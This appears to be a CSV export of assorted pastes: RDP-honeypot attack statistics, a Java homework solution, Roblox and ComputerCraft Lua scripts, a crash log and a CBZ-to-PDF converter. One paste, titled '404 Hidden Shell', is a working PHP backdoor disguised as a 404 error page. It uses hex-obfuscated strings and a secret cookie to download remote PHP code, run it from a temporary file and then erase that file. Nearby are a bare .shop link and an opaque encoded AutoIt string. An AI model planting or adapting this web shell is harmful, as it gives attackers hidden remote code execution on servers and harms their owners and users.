id,title,username,language,date,content
Es20TZUF,2025-06-07_stats.json,rdp_snitch,JSON,Sunday 8th of June 2025 07:18:19 PM CDT,"{
  ""ip"": {
    ""165.232.170.129"": 41709,
    ""167.172.131.118"": 8514,
    ""143.198.221.164"": 456,
    ""103.56.5.14"": 267,
    ""62.3.42.167"": 6,
    ""45.227.254.130"": 9,
    ""91.238.181.91"": 6,
    ""147.185.132.158"": 12,
    ""45.227.254.152"": 6,
    ""80.94.95.203"": 9,
    ""205.210.31.200"": 9,
    ""47.120.47.93"": 3,
    ""193.142.146.227"": 9,
    ""92.63.197.23"": 9,
    ""129.227.230.73"": 3,
    ""172.184.144.136"": 6,
    ""91.202.233.4"": 12,
    ""198.235.24.236"": 9,
    ""152.42.212.148"": 7077,
    ""104.236.244.191"": 9,
    ""128.199.168.88"": 4998,
    ""198.235.24.233"": 9,
    ""88.214.25.121"": 6,
    ""91.238.181.94"": 6,
    ""167.99.236.65"": 15,
    ""147.185.132.61"": 9,
    ""47.236.157.151"": 3
  },
  ""asn"": {
    ""AS14061"": 62778,
    ""AS140599"": 267,
    ""AS61173"": 6,
    ""AS267784"": 15,
    ""AS49434"": 12,
    ""AS396982"": 48,
    ""AS204428"": 9,
    ""AS37963"": 3,
    ""AS213438"": 9,
    ""AS210848"": 9,
    ""AS21859"": 3,
    ""AS8075"": 6,
    ""AS200593"": 12,
    ""AS35042"": 6,
    ""AS45102"": 3
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 62778,
    ""Comfac Corporation"": 267,
    ""Green Web Samaneh Novin PJSC"": 6,
    ""Flyservers S.A."": 15,
    ""Datacenter location PAR1 France"": 12,
    ""Google LLC"": 48,
    ""SS-Net"": 9,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 3,
    ""ColocaTel Inc."": 9,
    ""Telkom Internet LTD"": 9,
    ""Zenlayer Inc"": 3,
    ""Microsoft"": 6,
    ""Prospero OOO"": 12,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Alibaba (US) Technology Co., Ltd."": 3
  },
  ""org"": {
    ""DigitalOcean, LLC"": 62763,
    ""Comfac Corporation"": 267,
    ""Green Web Samaneh Novin PJSC"": 6,
    ""Xwin Universal LTD"": 15,
    ""ThinkTech Technology Industrial CO. Limited"": 18,
    ""Palo Alto Networks, Inc"": 48,
    ""Unmanaged LTD"": 9,
    ""Alibaba.com LLC"": 6,
    ""ColocaTel Inc"": 9,
    ""Korotkij Denis Aleksandrovich"": 9,
    ""NetProtect LLC"": 3,
    ""Microsoft Azure Cloud (westus)"": 6,
    ""Prospero OOO"": 12,
    ""Digital Ocean"": 15
  },
  ""regionName"": {
    ""South West"": 54240,
    ""New Jersey"": 8538,
    ""Metro Manila"": 267,
    ""Razavi Khorasan"": 6,
    ""Vilnius"": 15,
    ""\u00cele-de-France"": 12,
    ""California"": 54,
    ""Budapest"": 9,
    ""Guangdong"": 3,
    ""North Holland"": 18,
    ""Bangkok"": 3,
    ""Ashgabat"": 12,
    ""Kowloon City"": 6,
    ""North West"": 3
  },
  ""country"": {
    ""Singapore"": 54243,
    ""United States"": 8592,
    ""Philippines"": 267,
    ""Iran"": 6,
    ""Lithuania"": 15,
    ""France"": 12,
    ""Hungary"": 9,
    ""China"": 3,
    ""The Netherlands"": 18,
    ""Thailand"": 3,
    ""Turkmenistan"": 12,
    ""Hong Kong"": 6
  },
  ""account"": {
    ""hello"": 63063,
    ""Domain"": 18,
    ""Test"": 27,
    ""yhDxyQONx"": 6,
    ""nmap"": 3,
    ""naap"": 3,
    ""Administr"": 30,
    ""dRMIARzYe"": 3,
    ""ZzDQaL"": 3,
    ""TYPoLW"": 3,
    ""PVSCsdRvF"": 3,
    ""wVhDlN"": 3,
    ""SoFYtc"": 3,
    ""dFAyiNgDf"": 3,
    ""NRWHgv"": 3,
    ""hxudXJ"": 3,
    ""HgZvDBanI"": 3,
    ""TGZddU"": 3,
    ""VKzioF"": 3
  },
  ""keyboard"": {
    ""Unknown"": 63186
  },
  ""client_build"": {
    ""Unknown"": 63186
  },
  ""client_name"": {
    ""Unknown"": 63186
  },
  ""ip_type"": {
    ""hosting"": 62856,
    ""Unknown"": 327,
    ""mobile & hosting & proxy"": 3
  }
}"
HJ24vp0K,2025-06-07_stats.json,rdp_snitch,JSON,Sunday 8th of June 2025 07:16:22 PM CDT,"{
  ""ip"": {
    ""165.232.170.129"": 41707,
    ""167.172.131.118"": 8514,
    ""143.198.221.164"": 456,
    ""103.56.5.14"": 267,
    ""62.3.42.167"": 6,
    ""45.227.254.130"": 9,
    ""91.238.181.91"": 6,
    ""147.185.132.158"": 12,
    ""45.227.254.152"": 6,
    ""80.94.95.203"": 9,
    ""205.210.31.200"": 9,
    ""47.120.47.93"": 3,
    ""193.142.146.227"": 9,
    ""92.63.197.23"": 9,
    ""129.227.230.73"": 3,
    ""172.184.144.136"": 6,
    ""91.202.233.4"": 12,
    ""198.235.24.236"": 9,
    ""152.42.212.148"": 7077,
    ""104.236.244.191"": 9,
    ""128.199.168.88"": 4998,
    ""198.235.24.233"": 9,
    ""88.214.25.121"": 6,
    ""91.238.181.94"": 6,
    ""167.99.236.65"": 15,
    ""147.185.132.61"": 9,
    ""47.236.157.151"": 3
  },
  ""asn"": {
    ""AS14061"": 62776,
    ""AS140599"": 267,
    ""AS61173"": 6,
    ""AS267784"": 15,
    ""AS49434"": 12,
    ""AS396982"": 48,
    ""AS204428"": 9,
    ""AS37963"": 3,
    ""AS213438"": 9,
    ""AS210848"": 9,
    ""AS21859"": 3,
    ""AS8075"": 6,
    ""AS200593"": 12,
    ""AS35042"": 6,
    ""AS45102"": 3
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 62776,
    ""Comfac Corporation"": 267,
    ""Green Web Samaneh Novin PJSC"": 6,
    ""Flyservers S.A."": 15,
    ""Datacenter location PAR1 France"": 12,
    ""Google LLC"": 48,
    ""SS-Net"": 9,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 3,
    ""ColocaTel Inc."": 9,
    ""Telkom Internet LTD"": 9,
    ""Zenlayer Inc"": 3,
    ""Microsoft"": 6,
    ""Prospero OOO"": 12,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Alibaba (US) Technology Co., Ltd."": 3
  },
  ""org"": {
    ""DigitalOcean, LLC"": 62761,
    ""Comfac Corporation"": 267,
    ""Green Web Samaneh Novin PJSC"": 6,
    ""Xwin Universal LTD"": 15,
    ""ThinkTech Technology Industrial CO. Limited"": 18,
    ""Palo Alto Networks, Inc"": 48,
    ""Unmanaged LTD"": 9,
    ""Alibaba.com LLC"": 6,
    ""ColocaTel Inc"": 9,
    ""Korotkij Denis Aleksandrovich"": 9,
    ""NetProtect LLC"": 3,
    ""Microsoft Azure Cloud (westus)"": 6,
    ""Prospero OOO"": 12,
    ""Digital Ocean"": 15
  },
  ""regionName"": {
    ""South West"": 54238,
    ""New Jersey"": 8538,
    ""Metro Manila"": 267,
    ""Razavi Khorasan"": 6,
    ""Vilnius"": 15,
    ""\u00cele-de-France"": 12,
    ""California"": 54,
    ""Budapest"": 9,
    ""Guangdong"": 3,
    ""North Holland"": 18,
    ""Bangkok"": 3,
    ""Ashgabat"": 12,
    ""Kowloon City"": 6,
    ""North West"": 3
  },
  ""country"": {
    ""Singapore"": 54241,
    ""United States"": 8592,
    ""Philippines"": 267,
    ""Iran"": 6,
    ""Lithuania"": 15,
    ""France"": 12,
    ""Hungary"": 9,
    ""China"": 3,
    ""The Netherlands"": 18,
    ""Thailand"": 3,
    ""Turkmenistan"": 12,
    ""Hong Kong"": 6
  },
  ""account"": {
    ""hello"": 63061,
    ""Domain"": 18,
    ""Test"": 27,
    ""yhDxyQONx"": 6,
    ""nmap"": 3,
    ""naap"": 3,
    ""Administr"": 30,
    ""dRMIARzYe"": 3,
    ""ZzDQaL"": 3,
    ""TYPoLW"": 3,
    ""PVSCsdRvF"": 3,
    ""wVhDlN"": 3,
    ""SoFYtc"": 3,
    ""dFAyiNgDf"": 3,
    ""NRWHgv"": 3,
    ""hxudXJ"": 3,
    ""HgZvDBanI"": 3,
    ""TGZddU"": 3,
    ""VKzioF"": 3
  },
  ""keyboard"": {
    ""Unknown"": 63184
  },
  ""client_build"": {
    ""Unknown"": 63184
  },
  ""client_name"": {
    ""Unknown"": 63184
  },
  ""ip_type"": {
    ""hosting"": 62854,
    ""Unknown"": 327,
    ""mobile & hosting & proxy"": 3
  }
}"
xUL6iqvH,2025-06-07_stats.json,rdp_snitch,JSON,Sunday 8th of June 2025 07:15:12 PM CDT,"{
  ""ip"": {
    ""165.232.170.129"": 41705,
    ""167.172.131.118"": 8514,
    ""143.198.221.164"": 456,
    ""103.56.5.14"": 267,
    ""62.3.42.167"": 6,
    ""45.227.254.130"": 9,
    ""91.238.181.91"": 6,
    ""147.185.132.158"": 12,
    ""45.227.254.152"": 6,
    ""80.94.95.203"": 9,
    ""205.210.31.200"": 9,
    ""47.120.47.93"": 3,
    ""193.142.146.227"": 9,
    ""92.63.197.23"": 9,
    ""129.227.230.73"": 3,
    ""172.184.144.136"": 6,
    ""91.202.233.4"": 12,
    ""198.235.24.236"": 9,
    ""152.42.212.148"": 7077,
    ""104.236.244.191"": 9,
    ""128.199.168.88"": 4998,
    ""198.235.24.233"": 9,
    ""88.214.25.121"": 6,
    ""91.238.181.94"": 6,
    ""167.99.236.65"": 15,
    ""147.185.132.61"": 9,
    ""47.236.157.151"": 3
  },
  ""asn"": {
    ""AS14061"": 62774,
    ""AS140599"": 267,
    ""AS61173"": 6,
    ""AS267784"": 15,
    ""AS49434"": 12,
    ""AS396982"": 48,
    ""AS204428"": 9,
    ""AS37963"": 3,
    ""AS213438"": 9,
    ""AS210848"": 9,
    ""AS21859"": 3,
    ""AS8075"": 6,
    ""AS200593"": 12,
    ""AS35042"": 6,
    ""AS45102"": 3
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 62774,
    ""Comfac Corporation"": 267,
    ""Green Web Samaneh Novin PJSC"": 6,
    ""Flyservers S.A."": 15,
    ""Datacenter location PAR1 France"": 12,
    ""Google LLC"": 48,
    ""SS-Net"": 9,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 3,
    ""ColocaTel Inc."": 9,
    ""Telkom Internet LTD"": 9,
    ""Zenlayer Inc"": 3,
    ""Microsoft"": 6,
    ""Prospero OOO"": 12,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Alibaba (US) Technology Co., Ltd."": 3
  },
  ""org"": {
    ""DigitalOcean, LLC"": 62759,
    ""Comfac Corporation"": 267,
    ""Green Web Samaneh Novin PJSC"": 6,
    ""Xwin Universal LTD"": 15,
    ""ThinkTech Technology Industrial CO. Limited"": 18,
    ""Palo Alto Networks, Inc"": 48,
    ""Unmanaged LTD"": 9,
    ""Alibaba.com LLC"": 6,
    ""ColocaTel Inc"": 9,
    ""Korotkij Denis Aleksandrovich"": 9,
    ""NetProtect LLC"": 3,
    ""Microsoft Azure Cloud (westus)"": 6,
    ""Prospero OOO"": 12,
    ""Digital Ocean"": 15
  },
  ""regionName"": {
    ""South West"": 54236,
    ""New Jersey"": 8538,
    ""Metro Manila"": 267,
    ""Razavi Khorasan"": 6,
    ""Vilnius"": 15,
    ""\u00cele-de-France"": 12,
    ""California"": 54,
    ""Budapest"": 9,
    ""Guangdong"": 3,
    ""North Holland"": 18,
    ""Bangkok"": 3,
    ""Ashgabat"": 12,
    ""Kowloon City"": 6,
    ""North West"": 3
  },
  ""country"": {
    ""Singapore"": 54239,
    ""United States"": 8592,
    ""Philippines"": 267,
    ""Iran"": 6,
    ""Lithuania"": 15,
    ""France"": 12,
    ""Hungary"": 9,
    ""China"": 3,
    ""The Netherlands"": 18,
    ""Thailand"": 3,
    ""Turkmenistan"": 12,
    ""Hong Kong"": 6
  },
  ""account"": {
    ""hello"": 63059,
    ""Domain"": 18,
    ""Test"": 27,
    ""yhDxyQONx"": 6,
    ""nmap"": 3,
    ""naap"": 3,
    ""Administr"": 30,
    ""dRMIARzYe"": 3,
    ""ZzDQaL"": 3,
    ""TYPoLW"": 3,
    ""PVSCsdRvF"": 3,
    ""wVhDlN"": 3,
    ""SoFYtc"": 3,
    ""dFAyiNgDf"": 3,
    ""NRWHgv"": 3,
    ""hxudXJ"": 3,
    ""HgZvDBanI"": 3,
    ""TGZddU"": 3,
    ""VKzioF"": 3
  },
  ""keyboard"": {
    ""Unknown"": 63182
  },
  ""client_build"": {
    ""Unknown"": 63182
  },
  ""client_name"": {
    ""Unknown"": 63182
  },
  ""ip_type"": {
    ""hosting"": 62852,
    ""Unknown"": 327,
    ""mobile & hosting & proxy"": 3
  }
}"
TideJi6m,GeoWealth Homework,Petrov4o,Java,Sunday 8th of June 2025 06:59:07 PM CDT,"import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.*;
import java.util.stream.Collectors;

public class WordReducer
{
    private static final String WORDS_URL = ""https://raw.githubusercontent.com/nikiiv/JavaCodingTestOne/master/scrabble-words.txt"";
    private static final Set<String> VALID_ONE_LETTER_WORDS = Set.of(""I"", ""A"");

    private Set<String> dictionary;

    public static void main(String[] args) throws Exception
    {
        WordReducer reducer = new WordReducer();
        reducer.populateDictionary();

        System.out.println(""Dictionary loaded with "" + reducer.dictionary.size() + "" words.\n"");

        List<String> allNineLetterWords = reducer.dictionary.stream()
                .filter(w -> w.length() == 9)
                .toList();

        for (String word : allNineLetterWords)
        {
            List<String> chain = reducer.findSubWordChainBFS(word);
            if (chain != null)
            {
                System.out.println(""Chain found: "" + chain);
            }
        }
    }

    public void populateDictionary() throws Exception
    {
        URL url = new URL(WORDS_URL);
        try (BufferedReader br = new BufferedReader(new InputStreamReader(url.openConnection().getInputStream())))
        {
            dictionary = br.lines()
                    .skip(1)
                    .map(String::trim)
                    .filter(line -> !line.isEmpty())
                    .map(String::toUpperCase)
                    .filter(word -> word.length() != 1 || VALID_ONE_LETTER_WORDS.contains(word))
                    .collect(Collectors.toSet());
        }
        dictionary.add(""I"");
        dictionary.add(""A"");
    }

    public List<String> AllSubWordsFromWord(String word)
    {
        List<String> subWords = new ArrayList<>();
        for (int i = 0; i < word.length(); i++)
        {
            String sub = word.substring(0, i) + word.substring(i + 1);
            subWords.add(sub);
        }
        subWords.removeIf(String::isEmpty);
        return subWords.stream().distinct().collect(Collectors.toList());
    }

    public List<String> findSubWordChainBFS(String startWord)
    {
        if (!dictionary.contains(startWord))
        {
            return null;
        }

        Queue<List<String>> queue = new LinkedList<>();
        queue.add(List.of(startWord));

        Set<String> visited = new HashSet<>();
        visited.add(startWord);

        while (!queue.isEmpty())
        {
            List<String> currentChain = queue.poll();
            String currentWord = currentChain.get(currentChain.size() - 1);

            if (currentWord.length() == 1 && VALID_ONE_LETTER_WORDS.contains(currentWord))
            {
                return currentChain;
            }

            List<String> validSubWords = AllSubWordsFromWord(currentWord).stream()
                    .map(String::toUpperCase)
                    .filter(dictionary::contains)
                    .filter(word -> !visited.contains(word))
                    .toList();

            for (String subWord : validSubWords)
            {
                List<String> newChain = new ArrayList<>(currentChain);
                newChain.add(subWord);
                queue.add(newChain);
                visited.add(subWord);
            }
        }
        return null;
    }
}
"
SUQGEyDh,404 Hidden Shell,willysec_id,PHP,Sunday 8th of June 2025 06:56:08 PM CDT,"<?php
@ini_set('display_errors',0);
function _x7k9p($s){
    $r='';
    for($i=0;$i<strlen($s);$i+=2){
        $r.=chr(hexdec(substr($s,$i,2)));
    }
    return $r;
}
function _z3m5q($u){
    if(function_exists('curl_exec')){
        $c=curl_init($u);
        curl_setopt_array($c,[CURLOPT_RETURNTRANSFER=>1,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_USERAGENT=>'Mozilla/5.0',CURLOPT_SSL_VERIFYPEER=>0,CURLOPT_SSL_VERIFYHOST=>0]);
        $r=curl_exec($c);
        curl_close($c);
        return $r;
    }
    return false;
}
function _y4n2j(){
    $a=_x7k9p('6c757368');
    return isset($_COOKIE[$a])&&$_COOKIE[$a]===_x7k9p('666c61766f72');
}
if(_y4n2j()){
    $u=_x7k9p('68747470733a2f2f')._x7k9p('7261772e67697468756275736572636f6e74656e742e636f6d2f64616e313538342f617366646173').'/'._x7k9p('726566732f68656164732f6d61696e2f6173772e706870');
    $d=_z3m5q($u);
    if($d!==false){
        $randDir='/tmp/tmp_'.uniqid().'_'.rand(1000,9999);
        $randFile=$randDir.'/temp_'.md5(uniqid()).'.'.strtolower('php');
        mkdir($randDir, 0775, true);
        call_user_func(_x7k9p('66696c655f7075745f636f6e74656e7473'), $randFile, $d);
        include $randFile;
        unlink($randFile);
        rmdir($randDir);
    }
    else{
        echo '?'.$u;
    }
    exit;
}
?><!DOCTYPE html><html><head><title>404 Not Found</title><meta name=""robots"" content=""noindex,nofollow""><style>html,body{margin:0;padding:0;overflow:hidden;width:100%;height:100%}body{font-family:sans-serif}iframe{position:absolute;top:0;left:0;border:none;width:100%;height:100%}</style></head><body><iframe src=""//<?php echo $_SERVER['SERVER_NAME']; ?>/404"" id=""iframe_id"" onload=""document.title=this.contentDocument ? this.contentDocument.title : this.contentWindow.document.title;""></iframe></body></html>"
XUrqYsv5,OS - Startup,Rukerisu,Lua,Sunday 8th of June 2025 06:45:22 PM CDT,"-- Compzter Craft OS - Scrollable Menu

local options = {""Programs"", ""Files"", ""Shutdown"", ""Uninstall""}
local selected = 1

function clearScreen()
    term.clear()
    term.setCursorPos(1, 1)
end

function drawMenu()
    clearScreen()
    print(""=== Compzter Craft OS ===\n"")
    for i, option in ipairs(options) do
        if i == selected then
            print(""> "" .. option)
        else
            print(""  "" .. option)
        end
    end
    print(""\nUse W/S to move, Enter to select."")
end

function listPrograms()
    clearScreen()
    print(""=== Programs ===\n"")
    local programs = fs.list(""programs"")
    if #programs == 0 then
        print(""No programs found."")
    else
        for i, name in ipairs(programs) do
            print(i .. "". "" .. name)
        end
        print(""\nType number to run program or press Enter to go back:"")
        write(""> "")
        local choice = read()
        local index = tonumber(choice)
        if index and programs[index] then
            shell.run(""programs/"" .. programs[index])
        end
    end
    print(""\nPress any key to return..."")
    os.pullEvent(""key"")
end

function browseFiles()
    clearScreen()
    print(""=== Files ===\n"")
    shell.run(""ls"")
    print(""\nPress any key to return..."")
    os.pullEvent(""key"")
end

function shutdownOS()
    clearScreen()
    print(""Shutting down..."")
    sleep(1)
    os.shutdown()
end

function uninstallOS()
    clearScreen()
    print(""Are you sure you want to uninstall the OS? (yes/no)"")
    write(""> "")
    local confirm = read()
    if confirm == ""yes"" then
        fs.delete(""startup"")
        fs.delete(""programs"")
        print(""OS uninstalled. Rebooting..."")
        sleep(2)
        os.reboot()
    else
        print(""Uninstall cancelled."")
        sleep(1)
    end
end

function handleSelection()
    if selected == 1 then
        listPrograms()
    elseif selected == 2 then
        browseFiles()
    elseif selected == 3 then
        shutdownOS()
    elseif selected == 4 then
        uninstallOS()
    end
end

-- Main loop
while true do
    drawMenu()
    local event, key = os.pullEvent(""key"")
    if key == keys.w then
        selected = selected - 1
        if selected < 1 then selected = #options end
    elseif key == keys.s then
        selected = selected + 1
        if selected > #options then selected = 1 end
    elseif key == keys.enter then
        handleSelection()
    end
end
"
nBZXQHMA,Untitled,Nobodyking,Bash,Sunday 8th of June 2025 05:58:31 PM CDT,http://sub35nj7kmmlk.shop/
yh2d6KDL,Untitled,TakePen,AutoIt,Sunday 8th of June 2025 05:19:45 PM CDT,vtPo3hYnhlm7nnVBp4quqqqqqq#zfgsrP07HwrHPHbcWwWsrP07Hwr11bcWwWsrP07Hwrxg1elbBbp2rwHPTbt9KvKFyFeeeep2rHb58qq#ygbPTd9
Vm5j6pHB,2025-06-08T23:38:43.104,powerampache,PHP,Sunday 8th of June 2025 04:38:44 PM CDT,"1.00-69 (69) - DB: 83
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)

"
c8jkbfjd,CBZ to PDF converter,RedstoneHair,Python,Sunday 8th of June 2025 04:26:18 PM CDT,"import os
import sys
import zipfile
import shutil
from PIL import Image
from PyPDF2 import PdfMerger
from slashr import SlashR

sr = None

DIR = """" or (
	sys.argv[1] 
	if len(sys.argv) > 1 and os.path.isdir(sys.argv[1]) 
	else input(""Directory: "")
)

def progress(done: int, total: int):
    sr.print(f""{done} / {total}"")

def handle_file(path):
    if not path.lower().endswith("".cbz""):
        return
    print(f""PROCESS {os.path.basename(path)}"")
    temp_dir = os.path.join(DIR, ""temp"")
    pdf_dir = os.path.join(DIR, ""temp_pdfs"")
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
    if os.path.exists(pdf_dir):
        shutil.rmtree(pdf_dir)
    os.makedirs(temp_dir)
    os.makedirs(pdf_dir)
    with zipfile.ZipFile(path, 'r') as zip_ref:
        file_list = zip_ref.namelist()
        total_steps = len(file_list) * 2 + 1
        for i, file in enumerate(file_list):
            zip_ref.extract(file, temp_dir)
            progress(i + 1, total_steps)
    images = sorted([
        os.path.join(temp_dir, f)
        for f in os.listdir(temp_dir)
        if f.lower().endswith(("".png"", "".jpg"", "".jpeg"", "".bmp"", "".webp""))
    ])
    if images:
        pdf_paths = []
        for i, img_path in enumerate(images):
            pdf_path = os.path.join(pdf_dir, f""{i}.pdf"")
            img = Image.open(img_path).convert(""RGB"")
            img.save(pdf_path, ""PDF"", resolution=100.0)
            img.close()
            pdf_paths.append(pdf_path)
            progress(len(file_list) + i + 1, total_steps)
        merger = PdfMerger()
        for pdf in pdf_paths:
            merger.append(pdf)
        out_path = os.path.splitext(path)[0] + "".pdf""
        merger.write(out_path)
        merger.close()
        progress(total_steps - 1, total_steps)
    shutil.rmtree(temp_dir)
    shutil.rmtree(pdf_dir)
    progress(total_steps, total_steps)

def main():
    global sr
    for file in os.listdir(DIR):
        path = os.path.join(DIR, file)
        if os.path.isfile(path):
            with SlashR() as sr:
                handle_file(path)

if __name__ == ""__main__"":
    main()
"
pxhrFtYn,Untitled,XXsuperninjaXXop,Lua,Sunday 8th of June 2025 03:58:12 PM CDT,"local Players = game:GetService(""Players"")
local RunService = game:GetService(""RunService"")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local humanoid = char:WaitForChild(""Humanoid"")
local rootPart = char:WaitForChild(""HumanoidRootPart"")

local keybind = require(game.ReplicatedStorage.CoolModules.Keybind)

local dirteffect = char[""Left Leg""].LeftFootAttachment:WaitForChild(""DirtEffect"")

local FrontDash = char.Humanoid:FindFirstChild(""Animator""):LoadAnimation(script.Animations.Dash.Forward)
local LeftDash = char.Humanoid:FindFirstChild(""Animator""):LoadAnimation(script.Animations.Dash.Left)
local RightDash = char.Humanoid:FindFirstChild(""Animator""):LoadAnimation(script.Animations.Dash.Right)
local BackDash = char.Humanoid:FindFirstChild(""Animator""):LoadAnimation(script.Animations.Dash.Back)

local dashConfig = {
	speed = 90,
	cdtime = 2.5,
	duration = 0.3, 
	maxforce = Vector3.new(1, 0, 1) * 300000,
	minvelocity = 0.2
}

local dashState = {
	canDash = true,
	isDashing = false,
	dashStartTime = 0
}

local action = keybind.GetAction(""Fight"", ""Dash"")
action.KeyboardBinding.KeyCode = Enum.KeyCode.Q
action.GamepadBinding.KeyCode = Enum.KeyCode.ButtonX
action.KeyboardBinding.UIButton = player.PlayerGui.MobileButtons.Frame.DashButton
keybind.EnableContext(""Fight"")

local dashCDIcon = player.PlayerGui.Cooldowns.Frame.Dash

local function getDashDirection()
	local moveDirection = humanoid.MoveDirection
	if moveDirection.Magnitude == 0 then
		moveDirection = rootPart.CFrame.LookVector
	end

	local relativeDirection = rootPart.CFrame:VectorToObjectSpace(moveDirection)

	local forwardDot = relativeDirection.Z
	local rightDot = relativeDirection.X

	local threshold = 0.5

	if forwardDot > threshold then
		return BackDash
	elseif forwardDot < -threshold then
		return FrontDash
	elseif rightDot > threshold then
		return RightDash
	elseif rightDot < -threshold then
		return LeftDash
	else
		return FrontDash
	end
end

local function Dash()
	if not dashState.canDash then return end
	script.SFX.dash:Play()
	dashCDIcon.BackgroundTransparency = 0.7
	dashCDIcon.ImageTransparency = 0.7
	dashCDIcon.UIStroke.Transparency = 0.7
	if humanoid.FloorMaterial ~= Enum.Material.Air then
		local rayOrigin = rootPart.Position
		local rayDirection = Vector3.new(0, -5, 0)

		local raycastParams = RaycastParams.new()
		raycastParams.FilterDescendantsInstances = {player.Character}
		raycastParams.FilterType = Enum.RaycastFilterType.Exclude

		local result = workspace:Raycast(rayOrigin, rayDirection, raycastParams)

		if result and result.Instance then
			local partColor = result.Instance.Color
			local grayishColor = Color3.fromHex(""#a19691"")

			local startColor = grayishColor:Lerp(partColor, 0.7)
			local endColor = grayishColor:Lerp(partColor, 0.7)

			dirteffect.Color = ColorSequence.new{
				ColorSequenceKeypoint.new(0, startColor),
				ColorSequenceKeypoint.new(0.674, partColor),
				ColorSequenceKeypoint.new(1, endColor)
			}

		end
		dirteffect.Enabled = true
	end
	
	
	local currentanim :AnimationTrack
	dashState.canDash = false
	dashState.isDashing = true
	dashState.dashStartTime = os.clock()

	currentanim = getDashDirection()
	
	local direction
	if humanoid.MoveDirection.Magnitude > 0 then
		direction = humanoid.MoveDirection.Unit
	else
		direction = rootPart.CFrame.LookVector
	end
	
	local relativeDirection = char.HumanoidRootPart.CFrame:VectorToObjectSpace(char.Humanoid.MoveDirection)
	
	
	currentanim:Play(0.05)
	local bodyVelocity = Instance.new(""BodyVelocity"")
	bodyVelocity.MaxForce = dashConfig.maxforce
	bodyVelocity.Velocity = direction * dashConfig.speed * 5
	bodyVelocity.Parent = rootPart
	
	local dashConnection
	local reductionFactor = 1
	dashConnection = RunService.Heartbeat:Connect(function()
		local elapsed = os.clock() - dashState.dashStartTime
		
		if humanoid.MoveDirection.Magnitude > 0 then
			direction = humanoid.MoveDirection.Unit
		else
			direction = rootPart.CFrame.LookVector
		end
		if elapsed < dashConfig.duration and 
			rootPart.AssemblyLinearVelocity.Magnitude > dashConfig.speed * dashConfig.minvelocity then
			bodyVelocity.Velocity = direction * dashConfig.speed * reductionFactor
			reductionFactor -= 0.05
		else
			dashState.isDashing = false
			bodyVelocity:Destroy()
			dashConnection:Disconnect()
			task.wait(0.1)
			dirteffect.Enabled = false
		end
	end)
	task.delay(dashConfig.cdtime + dashConfig.duration, function()
		dashState.canDash = true
		if bodyVelocity then bodyVelocity:Destroy() end
		
		dashCDIcon.BackgroundTransparency = 0.4
		dashCDIcon.ImageTransparency = 0.4
		dashCDIcon.UIStroke.Transparency = 0.4
		
	end)
end


action.Pressed:Connect(function()
	if dashState.canDash then
		task.spawn(Dash)
	end
end)
"
Vyt1wU6h,weapons code,XXsuperninjaXXop,Lua,Sunday 8th of June 2025 03:56:51 PM CDT,"local module = {}

-- Cache frequently accessed objects
local Debris = game:GetService(""Debris"")
local slashEffects = game.ReplicatedStorage.SlashEffects:GetChildren()
local numSlashEffects = #slashEffects

function module.DamageHandler(tool:Tool|BasePart, hit:BasePart, knockback:number?,DoSlashes:boolean?,CritBoost:number?)
	local hitParent = hit.Parent
	local toolParent = tool.Parent
	if not hitParent or not toolParent then return end
	local hitHumanoid = hitParent:FindFirstChild(""Humanoid"")
	local toolHumanoid = toolParent:FindFirstChild(""Humanoid"")
	local hitTeam = hitParent:FindFirstChild(""Team"")
	local toolTeam = toolParent:FindFirstChild(""Team"")
	
	if not (hitHumanoid and toolHumanoid and hitTeam and toolTeam) then return end
	
	-- 0 is npcs 1 is players 3 is pvp players
	if (toolTeam.Value == 3 and hitTeam.Value == 1) or (toolTeam.Value == 1 and hitTeam.Value == 3) then
		return
	end

	if hitParent == toolParent or (toolTeam.Value ~= 3 and toolTeam.Value == hitTeam.Value) then
		return
	end
	
	local dmg = tool.Damage
	if not dmg then return end

	if CritBoost and CritBoost > 1 and tool:FindFirstChild(""CritSlash"") then
		tool.CritSlash:Play()
	elseif tool:FindFirstChild(""Slash"") then
		tool.Slash:Play()
		CritBoost = 1
	else
		CritBoost = 1
	end
	
	
	local char = toolParent
	local hitRootPart = hitParent:FindFirstChild(""HumanoidRootPart"")
	if not hitRootPart then return end
	
	local player = game.Players:GetPlayerFromCharacter(toolParent)
	if player then
		local tag = Instance.new(""ObjectValue"")
		tag.Value = player
		tag.Name = ""creator""
		tag.Parent = hitHumanoid
		game:GetService(""Debris""):AddItem(tag, 0.5)
	end
	
	local shield = hitParent:FindFirstChild(""Shield"") 
	if shield and shield:FindFirstChild(""Health"") then
		local angle = math.acos(hitRootPart.CFrame.LookVector:Dot((toolParent.HumanoidRootPart.Position - hitRootPart.Position).Unit))
		if angle < math.pi/2 then
			shield.Health.Value = math.max(0, shield.Health.Value - (dmg.Value * CritBoost))
			return
		end
	end
	
	if DoSlashes and hitRootPart:FindFirstChild(""SlashesGUI"") then
